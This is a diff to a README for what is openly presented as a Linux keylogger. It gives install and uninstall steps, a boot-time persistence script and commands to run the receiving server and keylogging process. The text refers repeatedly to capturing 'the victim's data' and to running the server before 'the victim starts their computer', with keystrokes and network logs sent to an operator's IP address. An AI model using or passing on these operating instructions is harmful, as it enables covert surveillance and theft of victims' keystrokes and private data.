@@ -8,6 +8,8 @@ To install the keylogger there is a bash script, `install.sh` which prompts to i
 sudo ./install.sh
 ```
 
+Note however, that if you are going to be testing on your own system this is not preferred. Instead use the `install-dev.sh` install script.
+
 ## Uninstall
 To uninstall the keylogger, run the bash script, `uninstall.sh` which deletes the folder `/.keylogger` and removes the startup script from `/etc/init./d` and removes it with `update-rc.d`. Run the following command to uninstall:
 
@@ -16,19 +18,20 @@ sudo ./uninstall.sh
 ```
 
 ## Use
-After running the install script, the keylogger should start automatically on each subsequent bootup of the system. Note that if `./server` is not run before hand, the keylogger, will not reconnect later. Therefore, if you wisth to capture the victim's data, make sure there is a server program running before the victim starts their computer. If you are testing on your system, then `ps -aux` to kill the processes, ghost and main that started on boot, and manually run the program. Run the following commands from the source directory:
+After running the install script, the keylogger should start automatically on each subsequent bootup of the system. Note that if `./server` is not run before hand, the keylogger, will not reconnect later. Therefore, if you wish to capture the victim's data, make sure there is a server program running before the victim starts their computer. If you are testing on your system, then run the following commands to start the keylogger:
 
 ```
-make server
-./server
-
 cd /.keylogger
-sudo ./main
+sudo ./server &
+sudo ./main &
 ```
+
+This will start the server and the main keylogging process.
 
 ### Notes
  - Make sure before hand that the client.c code has the ip address you want to send the information to, which will be where the server is running.
  - server will save two log files every three minutes in the folder in which it is running called keylog_received.txt and network_received.txt.
+ - server does not have to be run from `/.keylogger' or with `sudo` access. The binary can stand on its own.
 
 ## Notes
 This has only been tested with Ubuntu 16.04.
